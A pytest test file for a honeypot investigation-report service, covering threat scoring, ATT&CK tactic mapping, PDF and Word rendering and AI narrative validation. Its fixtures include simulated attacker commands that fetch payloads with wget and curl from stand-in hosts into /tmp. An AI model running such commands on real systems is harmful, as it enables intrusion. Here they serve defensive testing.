"""The upgraded investigation report: threat level, front matter, metrics and timings."""

import json
import re
from io import BytesIO

import httpx
import pytest
from docx import Document
from pypdf import PdfReader

from app.core.config import get_settings
from app.services.investigation_narrative import build_packet, model_card, validate_reply
from app.services.pdf_report import generate_pdf_report
from app.services.report_analytics import (
    SCALE,
    analytic_confidence,
    report_metrics,
    session_severity,
    threat_assessment,
)


def session(uuid, ip="192.0.2.42", protocol="ssh", started="2026-11-12T09:14:02+00:00", **extra):
    return {"session_uuid": uuid, "protocol": protocol, "attacker_ip": ip, "started_at": started, **extra}


def analysis(category, confidence=0.75, commands="whoami", **extra):
    return {
        "category": category,
        "confidence": confidence,
        "model_source": "rules",
        "evidence_commands": commands,
        **extra,
    }


def narrative_for(records):
    packet, _ = build_packet(records)
    case = packet["cases"][0]
    line_id, quote = next(iter(case["activity_lines"].items()))
    return {
        "summary": f"The source issued commands [{case['reference']}].",
        "findings": [{
            "title": "Recorded commands",
            "paragraph": f"The captured line is cited [{case['reference']}].",
            "references": [case["reference"]],
            "evidence_lines": [line_id],
            "quote": quote,
        }],
        "assessment": f"Limited to the recorded evidence [{case['reference']}].",
        "next_steps": f"Review the session [{case['reference']}].",
        "scope": packet["scope"],
        "reviewed_references": [case["reference"]],
        "model": "test-model",
        "generated_at": "2026-11-18T03:00:00+00:00",
        "model_card": {"quantization": "Q4_K - Medium", "parameters": 8953803264, "context_deployed": 4096},
        "telemetry": {"completion_tokens": 640, "predicted_per_second": 4.3, "wall_ms": 172400.0},
        "validation": {"citations": 1, "references": 4, "addresses": 0, "urls": 0, "findings": 1},
    }


def pdf_pages(content):
    return [page.extract_text() for page in PdfReader(BytesIO(content)).pages]


# -- threat level -----------------------------------------------------------


def test_benign_traffic_is_low_and_green():
    records = [(session("a"), analysis("benign", 0.0, ""))]
    result = threat_assessment(records)
    assert result["level"] == "low" and result["colour_name"] == "Green"
    assert 0 <= result["index"] <= 24


def test_level_follows_the_most_severe_session_and_stays_in_its_band():
    records = [
        (session("a"), analysis("benign", 0.0)),
        (session("b", "192.0.2.43"), analysis("reconnaissance")),
        (session("c", "192.0.2.44"), analysis("exploitation", 0.9, "wget http://198.51.100.7/x.sh",
                                               iocs=[{"type": "url", "value": "http://198.51.100.7/x.sh"}])),
    ]
    result = threat_assessment(records)
    assert result["level"] == "high" and result["colour_name"] == "Orange"
    assert 50 <= result["index"] <= 74
    assert result["peak"]["source"] == "192.0.2.44"
    assert result["distribution"] == {"low": 1, "medium": 1, "high": 1, "critical": 0}
    # The index is the band's base plus the printed factor points.
    assert result["index"] == min(74, round(50 + sum(f["points"] for f in result["factors"])))


def test_critical_tool_makes_a_session_critical_and_red():
    records = [(session("a"), analysis("exploitation", 0.9, detected_tools=["metasploit"]))]
    result = threat_assessment(records)
    assert result["level"] == "critical" and result["colour_name"] == "Red"
    assert result["index"] >= 75


def test_stored_severity_wins_over_recomputation():
    s = session("a", signals={"severity": "medium", "severity_score": 3.5})
    assert session_severity(s, analysis("exploitation", 0.9)) == ("medium", 3.5)


def test_colours_match_the_console_ramp():
    assert [SCALE[x]["colour"] for x in ("low", "medium", "high", "critical")] == [
        "#19b287", "#fab219", "#ec835a", "#d5405f",
    ]


def test_unconfirmed_model_techniques_do_not_count_as_observed_tactics():
    records = [(session("a"), analysis("exploitation", mitre={"techniques": [
        {"id": "T1105", "name": "Ingress Tool Transfer", "source": "rule:download", "tactics": ["TA0011"]},
        {"id": "T1070.003", "name": "Clear Command History", "source": "chimera", "support": 0.03,
         "unconfirmed": True, "tactics": ["TA0005"]},
    ]}))]
    result = threat_assessment(records)
    assert result["tactics"] == ["TA0011"]
    metrics = report_metrics(records, result)
    states = {t["id"]: t["state"] for t in metrics["techniques"]}
    assert states == {"T1105": "rule", "T1070.003": "unconfirmed"}


def test_analytic_confidence_reports_its_reasons():
    records = [(session("a"), analysis("exploitation", triage={"model": "kev-4b", "agrees_with_rules": True}))]
    metrics = report_metrics(records, threat_assessment(records), {"scope": {"unique_activity_groups": 1, "model_reviewed_groups": 1}})
    level, reason = analytic_confidence(metrics)
    assert level == "High" and "100%" in reason


# -- the document -----------------------------------------------------------


@pytest.fixture
def report_settings(monkeypatch):
    settings = get_settings()
    monkeypatch.setattr(settings, "REPORT_ORGANISATION", "Example University")
    monkeypatch.setattr(settings, "REPORT_PREPARED_FOR", "Review committee")
    monkeypatch.setattr(settings, "REPORT_RECIPIENTS", "Dr. Reviewer <reviewer@example.edu>")
    monkeypatch.setattr(settings, "REPORT_CONTACT_EMAIL", "team@example.edu")
    return settings


def _records():
    return [(
        session("upgrade-1", node="honeysentinel-debian"),
        analysis("exploitation", 0.9, "uname -a\ncurl http://198.51.100.9/a.sh -o /tmp/.a",
                 analysis_ms=57.7, triage={"model": "kev-4b", "p_compromise": 0.59, "agrees_with_rules": True}),
    )]


META = {
    "report_id": "HS-IR-20261118-ABCDEF12",
    "requested_at": "2026-11-18T02:57:00+00:00",
    "requester": {"name": "Security Admin", "email": "admin@example.org", "role": "admin"},
    "timings": {"snapshot_ms": 180.0, "queue_ms": 0.0, "narrative_ms": 172400.0},
}


def test_cover_shows_level_generation_time_and_duration(report_settings):
    records = _records()
    pages = pdf_pages(generate_pdf_report(records, "pdf", narrative_for(records), False, META))
    cover = pages[0]
    for expected in ["Threat Investigation Report", "HIGH", "TLP:AMBER", "HS-IR-20261118-ABCDEF12",
                     "GENERATED", "TIME TO GENERATE", "Example University", "Security Admin"]:
        assert expected in cover, expected
    # Snapshot + queue + AI analysis (172.6 s) plus rendering: just under three minutes.
    assert re.search(r"2 min [0-5]?\d s", cover), cover
    assert "PAGE 2 OF" in pages[1]


def test_front_matter_carries_the_formal_details(report_settings):
    records = _records()
    text = " ".join(pdf_pages(generate_pdf_report(records, "pdf", narrative_for(records), False, META)))
    for expected in ["Document control", "Transmittal", "reviewer@example.edu", "team@example.edu",
                     "Review committee", "Review and approval", "Contents", "Evidence SHA-256",
                     "Narrative model card", "Validation gates", "Q4_K - Medium", "8.95 billion"]:
        assert expected in text, expected


def test_generation_record_measures_every_step():
    records = _records()
    pages = pdf_pages(generate_pdf_report(records, "pdf", narrative_for(records), False, META))
    record = pages[-1]
    for expected in ["Report generation record", "Report requested", "18 Nov 2026, 02:57:00 UTC",
                     "Evidence snapshot", "180 ms", "AI analysis", "Document rendering", "Total time to generate"]:
        assert expected in record, expected


def test_administrator_export_is_marked_red():
    records = _records()
    cover = pdf_pages(generate_pdf_report(records, "pdf", narrative_for(records), True, META))[0]
    assert "TLP:RED" in cover


def test_word_report_has_cover_sections_and_measured_times():
    records = _records()
    doc = Document(BytesIO(generate_pdf_report(records, "docx", narrative_for(records), False, META)))
    paragraphs = " ".join(p.text for p in doc.paragraphs)
    cells = " ".join(c.text for t in doc.tables for row in t.rows for c in row.cells)
    assert "Threat level assessment" in paragraphs and "Report generation record" in paragraphs
    assert "Total time to generate" in cells
    assert re.search(r"Total time to generate\s+2 min", cells)
    assert doc.inline_shapes, "the cover and charts are pictures in Word"


def test_report_without_sessions_still_renders():
    pages = pdf_pages(generate_pdf_report([], "pdf", None))
    assert "LOW" in pages[0]


# -- model telemetry --------------------------------------------------------


async def test_model_card_reads_llama_cpp_props_and_models():
    def handler(request):
        if request.url.path == "/props":
            return httpx.Response(200, json={
                "model_alias": "wolfram", "model_ftype": "Q4_K - Medium",
                "model_path": "/models/wolfram-Q4_K_M.gguf", "build_info": "b11459-f498f864f", "n_ctx": 4096,
            })
        if request.url.path == "/v1/models":
            return httpx.Response(200, json={"data": [{"id": "wolfram", "meta": {
                "n_params": 8953803264, "size": 5618141184, "n_ctx_train": 262144, "n_vocab": 248320,
            }}]})
        return httpx.Response(404)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        card = await model_card(client, "http://wolfram:8080/v1")
    assert card == {
        "alias": "wolfram", "quantization": "Q4_K - Medium", "file": "wolfram-Q4_K_M.gguf",
        "runtime_build": "b11459-f498f864f", "context_deployed": 4096, "parameters": 8953803264,
        "size_bytes": 5618141184, "context_trained": 262144, "vocabulary": 248320,
    }


async def test_model_card_is_empty_when_the_server_says_nothing():
    async with httpx.AsyncClient(transport=httpx.MockTransport(lambda r: httpx.Response(404))) as client:
        assert await model_card(client, "http://model:8080/v1") == {}


def test_validation_counts_what_each_gate_checked():
    records = [(session("v"), analysis("exploitation", commands="curl http://198.51.100.9/a.sh -o /tmp/.a"))]
    packet, _ = build_packet(records)
    reply = {
        "summary": "The source 192.0.2.42 requested http://198.51.100.9/a.sh [E1].",
        "findings": [{"title": "Retrieval", "paragraph": "A retrieval was attempted [E1].", "evidence_lines": ["E1.L1"]}],
        "assessment": "An attempt only [E1].",
        "next_steps": "Check for a preserved payload [E1].",
    }
    result = validate_reply(json.dumps(reply), packet)
    # Two addresses: the source, and the host inside the URL.
    assert result["validation"] == {"addresses": 2, "urls": 1, "references": 4, "citations": 1, "findings": 1}


def test_tactics_come_from_the_mappers_attack_catalog():
    from app.ai.attack_catalog import catalog
    from app.services.report_analytics import TACTIC_NAMES, TACTICS

    catalog.load()
    assert [t for t, _ in TACTICS] == [t["id"] for t in catalog.tactics]
    # A tactic the catalog has and the classic list did not: no raw ids in the report.
    assert TACTIC_NAMES["TA0112"] == "Defense Impairment"
    records = [(session("a"), analysis("exploitation", mitre={"techniques": [
        {"id": "T1222.002", "name": "Linux and Mac Permissions", "source": "rule:make_executable", "tactics": ["TA0112"]},
    ]}))]
    assert threat_assessment(records)["tactics"] == ["TA0112"]


def test_case_lists_each_indicator_once_and_uuids_fit_one_line():
    records = [
        (session(f"{i:08d}-aaaa-bbbb-cccc-{i:012d}", started=f"2026-11-11T12:0{i}:00+00:00"),
         analysis("exploitation", commands="wget http://203.0.113.10/bins/x86",
                  iocs=[{"type": "url", "value": "http://203.0.113.10/bins/x86", "first_seen": f"2026-11-11T12:0{i}:00"}]))
        for i in range(3)
    ]
    text = "\n".join(pdf_pages(generate_pdf_report(records, "pdf", narrative_for(records), False, META)))
    # The case page: the last time its title appears (the first is the contents).
    case = text[text.rindex("E1 / SSH / exploitation"):text.rindex("Report generation record")]
    assert case.count("http://203.0.113.10/bins/x86") == 2  # the command line and one indicator row
    assert "00000002-aaaa-bbbb-cccc-000000000002" in text
